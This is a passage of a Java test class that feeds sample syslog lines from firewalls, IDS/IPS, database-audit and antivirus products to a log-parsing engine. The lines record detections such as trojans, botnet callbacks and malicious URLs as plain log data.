      data = "<190>date=2013-04-03 time=02:54:29 log_id=0211008192 type=virus subtype=infected pri=warning vd=\"root\" msg=\"File is infected.\" status=\"passthrough\" service=\"mm1\" src=1.1.1.1 dst=2.2.2.2 sport=2560 src_port=2560 dport=5120 dst_port=5120 src_int=\"lo\" dst_int=\"eth0\" policyid=12345 identidx=67890 serial=312 dir=rx file=\"file_name\" checksum=\"N/A\" quarskip=\"No skip\" virus=\"virus\" dtype=\"cat\" ref=\"http://www.easynetworks.com.cn/ve?vid=1\" url=\"N/A\" carrier_ep=\"carrier endpoint\" profile=\"N/A\" profiletype=\"N/A\" profilegroup=\"N/A\" user=\"user\" group=\"group\" agent=\"N/A\" from=\"N/A\" to=\"N/A\"";
      parse(botuEngine, data);*/
      data = "<1> 2023-12-12 10:22:20 APW1KSA0BM022099 FW 1 4 Fan_Ok";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testWebRayRaySAS() {
    String parserFile = "./resources/parsers/audit_webray_raysas_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<14>Jul 19 17:16:41 cicisp {\"typeid\":3,\"content\":{\"devid\":\"5e649da851c48ef3\",\"srcip\":\"12.2.0.2\",\"dstmac\":\"80-18-44-ea-27-30\",\"sessionkey\":\"5e649da851c48ef320230719171633001465\",\"returnrows\":0,\"rules\":[],\"devip\":\"12.2.0.17\",\"dp\":3366,\"ubegintime\":1689758193441131,\"uuid\":\"5e649da851c48ef320230719171633001465_1689758193_0\",\"sql\":\"LOGIN\",\"result\":2,\"hostname\":\"-\",\"sessiontime\":1689758193,\"appname\":\"libmariadb-3.2.3\",\"srcmac\":\"ec-d6-8a-dc-e2-89\",\"cfgname\":\"100_7\",\"sourcetype\":1,\"dstip\":\"12.2.100.7\",\"sp\":52002,\"msgtype\":1,\"sourceid\":123994636,\"took\":0,\"inserttime\":1689758197,\"returncode\":\"\",\"length\":5,\"column\":[],\"endtime\":1689758193,\"begintime\":1689758193,\"instancename\":\"-\",\"operate\":\"LOGIN\",\"dbname\":\"-\",\"response\":\"\",\"service\":\"-\",\"dbtype\":2,\"dbversion\":\"MySQL-8.0.33\",\"responselength\":0,\"templatecode\":\"4976d7ca80f2cb54c1c7d5c87fb0c7ef\",\"username\":\"casdao\",\"object\":[]}}";
      parse(botuEngine, data);
      data = "<14>Jul 19 17:16:41 cicisp {\"typeid\":3,\"content\":{\"devid\":\"5e649da851c48ef3\",\"srcip\":\"12.2.0.2\",\"dstmac\":\"80-18-44-ea-27-30\",\"sessionkey\":\"5e649da851c48ef320230719171633001465\",\"returnrows\":0,\"rules\":[],\"devip\":\"12.2.0.17\",\"dp\":3366,\"ubegintime\":1689758193721916,\"uuid\":\"5e649da851c48ef320230719171633001465_1689758193_1\",\"sql\":\"SET NAMES utf8mb4\",\"result\":2,\"hostname\":\"-\",\"sessiontime\":1689758193,\"appname\":\"libmariadb-3.2.3\",\"srcmac\":\"ec-d6-8a-dc-e2-89\",\"cfgname\":\"100_7\",\"sourcetype\":1,\"dstip\":\"12.2.100.7\",\"sp\":52002,\"msgtype\":2,\"sourceid\":123994636,\"took\":0,\"inserttime\":1689758197,\"returncode\":\"\",\"length\":17,\"column\":[],\"endtime\":1689758193,\"begintime\":1689758193,\"instancename\":\"-\",\"operate\":\"SET\",\"dbname\":\"-\",\"response\":\"\",\"service\":\"-\",\"dbtype\":2,\"dbversion\":\"MySQL-8.0.33\",\"responselength\":0,\"templatecode\":\"c64be5c6e91cdad08370b7189c583332\",\"username\":\"casdao\",\"object\":[{\"condition\":false,\"operate\":\"SET\",\"type\":\"\",\"object\":\"NAMES\"}]}}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testWebRayRaySAS3() {
    String parserFile = "./resources/parsers/dbaudit_webray_raysas[v3.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<36>{\"msgtype\": \"systemlog\", \"content\": {\"type\": \"11\", \"logtime\": \"2024-02-22 10:07:38\", \"level\": \"登录日志\", \"username\": null, \"srcip\": null, \"dstip\": \"10.150.251.102\", \"content\": \"用户superadmin登录失败，无法登陆!\"}, \"merge\": \"true\"}^@";
      parse(botuEngine, data);
      data = "<36>{\"msgtype\": \"systemlog\", \"content\": {\"type\": \"13\", \"logtime\": \"2022-12-08 17:06:33\", \"level\": \"修改配置日志\", \"username\": \"admin\", \"srcip\": \"192.168.200.200\", \"dstip\": \"192.168.200.5\", \"content\": \"用户admin在策略配置->事件响应->响应策略配置-> “事件响应限制配置修改”，成功\"}, \"merge\": \"true\"}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAntivirusAntity() {
    String parserFile = "./resources/parsers/antiVirus_antiy_kill_avl_sdk_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<14>Jun 28 05:27:03 localhost syslog: SERVERADDRESS='10.255.48.4',SOURCE='PCLOUD',GUID='63cbe2c9-2142-4e57-a642-48a0ae0842b8',NAME='25基地',ADDRESS='1.2.3.4',MAC='00-0C-29-EA-7D-0D',COMPUTER_NAME='TEST',OS='WinXP SP3',MEM_SIZE='8G',HARD_SIZE='300G',STATUS='install',LOGTYPE='CLIENT'";
      parse(botuEngine, data);
      data = "<14>Jun 28 05:27:03 localhost syslog: SERVERADDRESS='10.255.48.4',SOURCE='PCLOUD',GUID='63cbe2c9-2142-4e57-a642-48a0ae0842b8',NAME='25基地',ADDRESS='1.2.3.4',KBID='KB931261',FIXED='0',VUL_DESCRIPTION='通用即插即用中的漏洞可能允许远程执行代码',PUB_DATE='2007-04-10',LEVEL='3',LOGTYPE='PATCH'";
      parse(botuEngine, data);
      data = "<14>Jan 2 15:49:04 localhost syslog: SERVERADDRESS='28.1.2.21:80',SOURCE='PCLOUD',GUID='991eec5f-68bb-4f00-8242-5fd4c7a983f9',NAME='某区域私有云安全系统',ADDRESS='192.168.26.131',ACTION='KILLED',TYPE='Troj',NAV_VIRUS='Win32.Troj.EnCodeFk.ak.(kcloud)',FILE_NAME='d:\\工作资源\\apsc项目\\apsc病毒样本1\\virus-shuai\\md5\\1\\1a8\\1a872219363e0b9b34e58f49289cf8e7',CREATE_TIME='2015-07-09 11:34:16',LAST_TIME='2015-07-09 11:34:16',LOGTYPE='SCAN'";
      parse(botuEngine, data);
      data = "<14>Jul 30 19:26:02 localhost syslog: SERVERADDRESS='28.1.2.21:80',SOURCE='PCLOUD',GUID='991eec5f-68bb-4f00-8242-5fd4c7a983f9',NAME='海南',ADDRESS='30.170.21.6',INSTRUCTION='释放文件',OPTION='已阻止',MD5='9eb867933136ad37eaf7f2ecb97e3a4d',TARGET_MD5='0ba48f2adb108c0cb3fc0f106a00f951',TARGET_NAME='',SUB_PROC='',PROC='C:\\WINDOWS\\explorer.exe',WHO='桌面防御',DEFEND_TIME='2015-07-30 19:27:20',LOGTYPE='DEFEND'";
      parse(botuEngine, data);
      data = "<14>Jun 28 05:27:03 localhost syslog: SERVERADDRESS='10.255.48.4',SOURCE='PCLOUD',GUID='63cbe2c9-2142-4e57-a642-48a0ae0842b8',NAME='25基地',ADDRESS='1.2.3.4',INSTRUCTION='云鉴定监控策略-系统监控',OPTION='允许运行',DEFEND_TIME='2013-09-26 10:11:12',LOGTYPE='POLICY'";
      parse(botuEngine, data);
      data = "<14>Jun 28 05:27:03 localhost syslog: SERVERADDRESS='10.255.48.4',SOURCE='PCLOUD',GUID='63cbe2c9-2142-4e57-a642-48a0ae0842b8',NAME='25基地',ADMIN='xiaoli',OPERATING_RECORD='登陆系统',OPERATING_TIME='2013-09-26 10:11:12',LOGTYPE='AUDIT'";
      parse(botuEngine, data);
      data = "<14>Jun 28 05:27:03 localhost syslog: SERVERADDRESS='10.255.48.4',SOURCE='PCLOUD',GUID='63cbe2c9-2142-4e57-a642-48a0ae0842b8',NAME='25基地',ADMIN='xiaoli',SIGN='7AFAC82C9A137048D97174A8494BC1E1',STATUS='2',SAMPLE_TIME='2013-09-26 10:11:12',LOGTYPE='BASELINE'";
      parse(botuEngine, data);
      data = "<14>Jun 28 05:27:03 localhost syslog: SERVERADDRESS='10.255.48.4',SOURCE='PCLOUD',GUID='63cbe2c9-2142-4e57-a642-48a0ae0842b8',NAME='25基地',FAULT_NAME='静态鉴定器故障',FAULT_TIME='2013-09-26 10:11:12',LOGTYPE='FAULT'";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testUtmVenus() {
    String parserFile = "./resources/parsers/utm_venus_utm_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<5>kernel: devid=0 date=\"2018/04/26 16:13:49\" dname=WW-5-9-FW-01 logtype=1 pri=5 ver=0.3.0 rule_name=utm_rulename mod=pf sa=172.17.5.243 sport=3818 type=NULL da=172.17.101.82 dport=7302 code=NULL proto=TCP policy=POLICY_PERMIT duration=0 rcvd=52 sent=52 fwlog=0 dsp_msg=\"test测试UTM\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testUtsNsFocus() {
    String parserFile = "./resources/parsers/ips_nsfocus_uts_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "nsfocus,V1,flow,TCPUDP,10.41.11.160,440F-ABE2-59EC-BA9D,UTS,63dcc2762d8eccbbccea540001,1675412116,10.41.71.45,,22:1d:07:d6:37:c0,52890,TCP,postgres,Postgresql,192.168.1.17,,30:7b:ac:f6:df:08,5432,2023-02-03 16:15:16,,,,1675412085,1675412116,9,437,8,595,,,,,,,,,,26";
      parse(botuEngine, data);
      data = "nsfocus,V1,flow,HTTP,10.41.11.160,440F-ABE2-59EC-BA9D,UTS,63dcc24f2d8eccbba29353ff00,1675412056,10.41.71.88,,30:7b:ac:f6:df:08,49832,TCP,http,Http Video,116.162.6.208,,22:1d:07:d6:37:c0,80,2023-02-03 16:14:16,,,,GET,/finderv1.video.qq.com/251/20302/stodownload?X-snsvideoflag=xV9&adaptivelytrans=0&bizid=1023&cdnkey=Cvvj5Ix3eewK0tHtibORqcsqchXNh0Gf3sJcaYqC2rQAF7DZm7JxdnVnLHcCBWK7HITEicIv6tmpXy1VbY58rmxSsaMr5uw92ocoiaAiaLC2wHOkaQlianHTKXNX80zBiaOjic2&cdntoken=3F19AMSV1UU,116.162.6.208,,,MicroMessenger Client,,,,206,, video/mp4,,rBpMBxnbXBuHiNqBQFsN1sbA2+7mtfBEUYxfQKQ7i5sPv3EGzdAJ0Buy4+2SGQ+vr2En164Aua9Sf3PpUO6AIZmVzGosksOKXPZ1opZC8hK1lrBzS84ZIzVFV9/DNhuHVYpJeeUZh2YxLelV89Rvhm+MPT6+Yzw7Y+G7txb3c+5slDQa7luvXRqy2DY3V+a8BvbM2zzmW2Ld6GFht7f29u/cc6C2e3+J78Wbk2+ub/PDTp1fG3T0bMuzG+yyy9buhhuGtrbssXVo5lhm4uHnXD0Lb7G3hf4rltqH1bZ+CBzbL9Gi1DfZdOpXn3n3oWW+KF99zmIX3XbcLbnoGGIHoXoXMtvOgbVlCg7KivMuJqG3d3xA+scAABXhQZsJnhClsmUwFFxPBAcmo2eNMOQaOBeI0KE3SOGM065TdZb0YsW3UyG30In+1w6/uT7McN0x7LpsOaMmBRKfyC3gLDiFIY0ed1UbGPz+7XJ1FmA8xJd0kjH+9bUNss1iXEaEwPgaYAydn8L4lUItBt0O4widjjXwuhfvNpGa0tjre7P7hVEA7SRY3FSsoX33cdMikE8zdXyWWasO9AbAcBzcM3nMj1pebcnGxJ9zfB92AwNkU9/XE6mIsGLmtJQca/blcwK1CxVDhMC7vqyNRJUrvZ9a0YmRfolo563kGmZkjdkEbQ6kqsSV1esot9C4KgxdphPpF4Wn3xkqDPQAen8pyiPJ3Ng3G7kxVfLbYK6VrflN5Zje19RaKmAq+/gmLa6ZTS98AlTVnPvb7L82aU+rVBu9pUw8AaK6DwtAzTVlUc4/hUq8PVDZJ2YjKSnTZDjY/GIZ/i1Ocr2u4qzFdc0vpWJ7KYw5+c6XruIQRACiCkbRv7n1X+kKpEmnkbT/1cPe9ovW8q+iDkz3aTvepqXgqa7yBT7HcG7sUYiF22h5mNUFuI0y4EGo5cOHjvfvGE5fvmYiN2G/7G9BpiYhuqLbJhl5bkHoHR0hbFJloBU/uB7AIcGWyAuFhYIXRIPr7AtkCMpp,1.1 ,1.1 ,0,,,0,";
      parse(botuEngine, data);
      data = "nsfocus,V1,flow,DBOP,10.41.11.160,440F-ABE2-59EC-BA9D,UTS,63dcc1e02d8eccbba67f540001,1675411936,10.41.71.45,,22:1d:07:d6:37:c0,51966,TCP,postgres,Postgresql,192.168.1.17,,30:7b:ac:f6:df:08,5432,2023-02-03 16:12:16,,,,Postgres,postgres,amdb_collect,,SET application_name = 'PostgreSQL JDBC Driver',";
      parse(botuEngine, data);
      data = "nsfocus,V1,flow,DNS,10.41.11.160,440F-ABE2-59EC-BA9D,UTS,63dcc1a42d8eccbb700753ff00,1675411875,10.41.71.160,,30:7b:ac:f6:df:08,63758,UDP,dns,DNS协议,202.102.224.68,,22:1d:07:d6:37:c0,53,2023-02-03 16:11:15,,,,pull-rtmp-l6-cny.douyincdn.com,A,internet,48,180,534,0,CNAME;CNAME;A,pull-rtmp-l6-cny.douyincdn,,,33152,,,,0,4";
      parse(botuEngine, data);
      data = "nsfocus,V1,flow,SSL,10.41.11.160,440F-ABE2-59EC-BA9D,UTS,63dcc1682d8eccbb5f3353ff00,1675411815,10.41.51.71,,30:7b:ac:f6:df:08,50926,TCP,ssl,SSL,125.44.162.194,,22:1d:07:d6:37:c0,443,2023-02-03 16:10:15,,,,TLS 1.2,img.qwps.cn,img.qwps.cn,TLS_AES_256_GCM_SHA384;TLS_CHACHA20_POLY1305_SHA256;TLS_AES_128_GCM_SHA256;TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,server_name;ec_point_formats;supported_groups;session_ticket;encrypt_then_mac;extended_master_secret;signature_algorithms,renegotiation_info;ec_point_formats;session_ticket;extended_master_secret,33,296,365,0,0,2,0,0,,uncompressed;ansiX962_compressed_prime;ansiX962_compressed_char2;uncompressed;ansiX962_compressed_prime,114,1,null,sha256WithRSAEncryption,,DigiCert Inc/GeoTrust CN RSA CA G1,Zhuhai Kingsoft Office Software Co.\\, Ltd./img.qwps.cn,,";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIpsHuawei() {
    String parserFile = "./resources/parsers/ips_huawei_nip6000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "Aug 6 2011 20:34:46 HUAWEI %% 01 HWCM/5/EXIT(I)[1]: exit from configure mode";
/*      parse(botuEngine, data);
      data = "Aug 6 2011 20:34:46 HUAWEI %% 01 IPS/4/CNC(l): A malware domain was detected. (SyslogId=21, VSys=23, Policy=32, SrcIp=10.2.2.1, DstIp=10.1.2.1, SrcPort=80, DstPort=8080, SrcZone=, DstZone=, User=zhang, Protocol=http, Application=wechat.exe,Profile=a.txt,DomainName=www.baidu.com, EventNum=5, Action=alert)";
      parse(botuEngine, data);
      data = "<188>2023/08/25 07:39:34 CD-DDS-NIP6600-02 %%01ATK/4/FIREWALLATCK(1): AttackType=\"Udp flood attack\", slot=\" \", cpu=\"0\", receive interface=\"\", proto=\"UDP\", src=\"\", dst=\"192.168.0.112:0 \", speed=\"30659\", User=\"\" Action=\"alert\"";
      parse(botuEngine, data);
      data = "<190>2023-07-28 11:24:05 NIP6000D %%01AV/4/VIRUS(1): A virus was detected. (SyslogId=12345, Policy=VIRUS,  SrcIp=192.168.0.20, DstIp=192.168.0.22, SrcPort=34621, DstPort=443, Protocol=UDP, Application=firewall,  Profile=app.yml,  EventNum=12345, SignatureId=123 ViruName=VIRUS.ATT, DetectionType=?virus detect, Direction=1, FileName=7788, FileType=8899, Action=alert, Hash=123)";
      parse(botuEngine, data);*/
      data = "<190>2023-07-28 11:24:05 NIP6000D %%01IPS/4/TPROJAN(1): A trojan horse was detected. (Syslogid=123456, VSys=public, Policy=ips, SrcIp=192.168.0.20, DstIp=192.168.0.22, SrcPort=34621, DstPort=443, SrcZone=srczone DstZone=dstzone, User=admin, Protocol=UDP, Application=firewall, Profile=app.yml, SignName=1qaz, SignId=123, EventNum=trojan, Target=server, Severity=high, Os=windows, Category=TROJAN.TPC, Role=1, SrcLocation=beijing, DstLocation=jinan, Action=alert, Extend=123)";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIdsNsFocus() {
    String parserFile = "./resources/parsers/ids_nsfocus_nids[5.6r11f]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "device_type=\"ips\";manufacturers=\"nsfocus\";hash=\"F594-B803-57EE-1D63\";time=2021-12-29 15:20:05;user=\"admin\";loginip=\"10.14.62.120\";msg=\"用户通过web界面，数据核CPU利用率禁用告警规则[1]\";log_type=\"2\";oper_result=\"success\";";
/*      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=ips_log;time=1642400984;card=T2/1;sip=10.14.69.177;smac=00:0C:29:32:E9:4A;sport=32656;dip=10.14.14.189;dmac=00:1B:21:0B:ED:CA;dport=21;vid=0;ruleid=40041;event=FTP服务客户端使用空口令登录;module=0;threat_level=2;threat_type=044 配置不当;attack_type=1;action=1;acted=1;count=1;protocol=TCP;user_name=;smt_user=;policy_id=1;digest=RlRQblNmMEN1c0NMSUVOVA==;direction=client;szonename=Monitor;dzonename=;rawinfo=ABshC+3KAAwpMulKCABFAAAvJgtAAIAGAAAKDkWxCg4OvX+QABWGuNkCYkdeVlAYQBpoqwAAUEFTUyANCg==;rawlen=84;cdnip=;extension=;popular=2;affect_os=Windows,Linux/Unix;service=FTP;ar=2;cve_id=;cwe_id=;cnnvd_id=;src_asset=0;dst_asset=0;scountry=;scity=;dcountry=;dcity=";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=malicious_file_log;time=1642401394;card=T2/1;sip=30.1.1.2;smac=00:50:56:A3:06:BF;sport=42316;dip=30.1.1.1;dmac=00:50:56:A1:5B:AD;dport=80;vid=0;ruleid=83942350;event=Trojan.Generic.2f24e75c;module=3;threat_level=2;threat_type=木马;action=17;acted=17;count=1;protocol=TCP;user_name=;smt_user=;policy_id=1;direction=server;szonename=Monitor;dzonename=;cdnip=;file_type=;file_size=0;file_md5=;file_sha256=;orig_name=;new_name=;url=;ar=2;cve_id=;service=MISC;src_asset=0;dst_asset=0;scountry=美国;scity=;dcountry=美国;dcity=";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=advance_threat_file_log;time=1602572178;card=T1/2;sip=10.67.5.50;smac=B8-CA-3A-BA-F2-45;sport=52728;dip=10.67.4.201;dmac=18-03-73-AF-88-D6;dport=25;vid=0;ruleid=41769;event=Trojan.Agent.BDXT;module=12;threat_level=5;threat_type=av;action=1;acted=1;count=1;protocol=TCP;policy_id=0;cdnip=;user_name=;smt_user=;file_md5=0006beaffe4b21d713583036b77d88ac;file_sha256=7896d280794b2e82b7b3f0fce626c1e62c50c0cefbf175a77d75a913f9b35647;orig_name=A1F1D44D88434A3299BF96DEBF67A601;new_name=0006beaffe4b21d713583036b77d88ac;tacinfo=;url=;submit_time=1602572156;taskid=409ac70405f8530a16025681400ed479;file_type=;file_size=482273;tags=[\"trojan\"];app_info=;threat_info=[{\"description\": \"\\u6728\\u9a6c\", \"threat_name\": \"Trojan.Agent.BDXT\", \"behavior\": \"Trojan\", \"proposal\": \"\\u4f7f\\u7528\\u6740\\u8f6f\\u8fdb\\u884c\\u5168\\u76d8\\u67e5\\u6740\", \"threat_level\": \"high\", \"engine_type\": \"av\"}];dropped=[];file_structure={\"PE Type\": \"PE32\", \"Internal Name\": \"large\", \"Machine Type\": \"Intel 386 or later, and compatibles\", \"File OS\": \"Win32\", \"Code Size\": \"245760\", \"OS Version\": \"5.1\", \"Entry Point\": \"0x61000\", \"File Flags Mask\": \"0x003f\", \"Linker Version\": \"11.0\", \"File Subtype\": \"0\", \"Uninitialized Data Size\": \"0\", \"File Version\": \"or is a\", \"Initialized Data Size\": \"137728\", \"File Description\": \"Obtaining operating database with\", \"Product Version Number\": \"1.8.0.0\", \"Product Name\": \"large\", \"Company Name\": \"large\", \"MIME Type\": \"application/octet-stream\", \"Character Set\": \"Windows, Latin1\", \"Time Stamp\": \"2014:01:24 03:47:25+08:00\", \"Language Code\": \"English (U.S.)\", \"File Version Number\": \"1.8.0.0\", \"File Type\": \"Win32 DLL\", \"Original Filename\": \"Obtaining operating database with\", \"Legal Copyright\": \"Copyright (C) 2014\", \"Subsystem\": \"Windows GUI\", \"Object File Type\": \"Dynamic link library\", \"Image Version\": \"0.0\", \"File Flags\": \"(none)\", \"Subsystem Version\": \"5.1\", \"Product Version\": \"large\"};file_basic={\"crc32\": 4083226098, \"sha256\": \"7896d280794b2e82b7b3f0fce626c1e62c50c0cefbf175a77d75a913f9b35647\", \"md5\": \"0006beaffe4b21d713583036b77d88ac\", \"sha1\": \"d6bdb4d72de4ae41cce80fd3e5cb6f00b90ab61a\"};ar=2;cve_id=;network=;src_asset=0;dst_asset=0;scountry=保留;scity=;dcountry=保留;dcity=";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=malicious_file_callback_log;time=1602582141;card=T1/2;sip=10.14.62.120;smac=70:B5:E8:29:35:01;sport=64723;dip=220.181.107.181;dmac=D8:24:BD:89:78:CA;dport=80;vid=0;ruleid=41765;event=恶意样本回联;module=13;threat_level=-1;action=17;acted=17;count=1;protocol=TCP;cdnip=;user_name=;smt_user=;policy_id=1;direction=client;szonename=Monitor;dzonename=;callback_type=domain;callback_address=www.hao123.com;callback_label=;ar=0;src_asset=0;dst_asset=0;scountry=保留;scity=;dcountry=中国;dcity=北京";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=cc_log;time=1642402370;card=T2/1;sip=61.139.2.69;smac=1C:20:DB:C2:48:2E;sport=53;dip=10.70.43.152;dmac=34:29:8F:74:8F:94;dport=64474;vid=0;ruleid=41044;event=僵尸网络;module=9;threat_type=C&C主机;action=17;acted=17;count=1;protocol=UDP;user_name=;smt_user=;policy_id=1;direction=server;szonename=Monitor;dzonename=;cdnip=;botnet=tool.chacuo.net;botnet_family=Ramnit;ar=2;src_asset=0;dst_asset=0;botnet_id=0;scountry=中国;scity=成都市;dcountry=;dcity=";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=wb_dns_log;time=1642402370;card=T2/1;sip=61.139.2.69;smac=1C:20:DB:C2:48:2E;sport=53;dip=10.70.43.152;dmac=34:29:8F:74:8F:94;dport=64474;vid=0;ruleid=41756;event=网络中发现可疑DNS行为(DNS黑名单);module=11;threat_level=2;threat_type=其他;action=17;acted=17;count=1;protocol=UDP;user_name=;smt_user=;policy_id=0;direction=server;szonename=Monitor;dzonename=;cdnip=;ip=117.34.61.87;domain=tool.chacuo.net;engine=DNS black list;ar=2;src_asset=0;dst_asset=0;scountry=中国;scity=成都市;dcountry=;dcity=";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=wb_malicious_ip_log;time=1642402802;card=T2/1;sip=61.139.2.69;smac=1C:20:DB:C2:48:2E;sport=53;dip=10.70.43.133;dmac=54:05:DB:CE:2C:51;dport=63080;vid=0;ruleid=41584;event=;module=10;threat_level=2;threat_type=其他;action=17;acted=17;count=1;protocol=UDP;user_name=;smt_user=;policy_id=1;direction=server;szonename=Monitor;dzonename=;cdnip=;ip=10.70.43.133;wb_type=黑名单;engine=;ar=2;src_asset=0;dst_asset=0;scountry=中国;scity=成都市;dcountry=;dcity=";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=web_secure_log;time=1642403079;card=T2/1;sip=10.8.59.1;smac=08:00:27:74:A2:27;sport=1487;dip=203.88.175.67;dmac=D8:24:BD:89:78:C8;dport=80;vid=0;ruleid=40816;event=;module=6;threat_level=2;threat_type=C&C主机;action=17;acted=17;count=1;protocol=TCP;user_name=;smt_user=;policy_id=1;direction=client;szonename=Monitor;dzonename=;rawinfo=;rawlen=376;cdnip=;url=http://guajfskajiw.43242.com/2/xia/wow.txt;digest=SFRUUG5TZjBDdXNndWFqZnNrYWppdy40MzI0Mi5jb21uU2YwQ3VzaHR0cDovL2d1YWpmc2thaml3LjQzMjQyLmNvbS8yL3hpYS93b3cudHh0blNmMEN1c0MmQ+S4u+acug==;websecure_type=恶意URL;ar=2;src_asset=0;dst_asset=0;scountry=;scity=;dcountry=中国;dcity=香港特别行政区";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=ddos_log;time=1642403512;card=T2/1;sip=0.0.0.0;smac=00:90:FB:2F:E1:ED;sport=0;dip=0.0.0.0;dmac=90:B1:1C:8F:DE:CA;dport=0;vid=0;ruleid=40688;event=ARP协议MAC地址欺骗攻击;module=0;acted=1;protocol=UNKNOWN;user_name=;smt_user=;direction=server;szonename=Monitor;dzonename=;cdnip=;service=MISC;ar=2;src_asset=0;dst_asset=0;scountry=;scity=;dcountry=;dcity=";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=sensitive_file_log;time=1642403933;card=T2/1;sip=10.8.55.20;smac=00:0C:29:A0:9F:98;sport=52863;dip=10.8.55.1;dmac=D4:BE:D9:95:26:AB;dport=80;vid=0;ruleid=33947667;event=Adobe Portable Document Format (PDF);module=5;threat_level=1;action=17;acted=17;count=1;protocol=TCP;user_name=;policy_id=1;digest=SFRUUG5TZjBDdXNTRVJWRVI=;direction=server;szonename=Monitor;dzonename=;cdnip=;service=WWW;file_name=;src_asset=0;dst_asset=0;scountry=;scity=;dcountry=;dcity=";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=sensitive_data_log;time=1642404272;card=T2/1;sip=10.34.17.207;smac=00:50:56:AF:00:19;sport=20;dip=10.34.9.226;dmac=00:23:AE:6D:F1:DC;dport=2538;vid=0;ruleid=33816898;event=中国移动 手机;module=5;threat_level=1;action=17;acted=17;count=1;protocol=TCP;user_name=;policy_id=1;digest=RlRQLURBVEFuU2YwQ3VzU0VSVkVSblNmMEN1c0QxMzgwMDEzODAwMG5TZjBDdXNGICB0ZWwudHh0DQo=;direction=server;szonename=Monitor;dzonename=;cdnip=;service=WWW;src_asset=0;dst_asset=0;scountry=;scity=;dcountry=;dcity=";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=abaction_log;time=1642404626;card=T2/1;sip=61.139.2.69;smac=1C:20:DB:C2:48:2E;sport=53;dip=10.70.43.160;dmac=54:E1:AD:B9:12:8D;dport=49638;vid=0;ruleid=34078721;event=服务器非法外联;module=7;action=1;acted=1;count=1;protocol=UDP;user_name=;smt_user=;policy_id=0;digest=RE5T;service=WWW;direction=server;szonename=Monitor;dzonename=;cdnip=;ar=2;src_asset=0;dst_asset=0;scountry=中国;scity=成都市;dcountry=;dcity=";
      parse(botuEngine, data);
      data = "device_type=ips;manufacturers=nsfocus;security_name=ws_log;time=1642405337;card=T2/1;sip=10.245.25.119;smac=BC:30:5B:A7:7C:7C;sport=52012;dip=211.103.159.74;dmac=10:8C:CF:20:85:C6;dport=80;vid=0;ruleid=50243;event=用户访问受控URL;module=2;action=1;acted=1;count=1;protocol=TCP;user_name=;policy_id=1;digest=SFRUUG5TZjBDdXNDTElFTlRuU2YwQ3Vz5pyq55+lblNmMEN1c3JzdXAxMC5yaXNpbmcuY29tLmNublNmMEN1cy9SZWdpc3Rlci9WYWxpZGF0ZS9QYWdlSW5mby9SZXF1ZXN0RmluaXNoZWQyMDEyLmFzcHg/blNmMEN1c1VSTD0vUmVnaXN0ZXIvVmFsaWRhdGUvUGFnZUluZm8vUmVxdWVzdEZpbmlzaGVkMjAxMi5hc3B4P25TZjBDdXNIT1NUPXJzdXAxMC5yaXNpbmcuY29tLmNu;direction=client;szonename=Monitor;dzonename=;domain=rsup10.rising.com.cn;cdnip=;category=未知;src_asset=0;dst_asset=0;scountry=;scity=;dcountry=中国;dcity=北京市";
      parse(botuEngine, data);
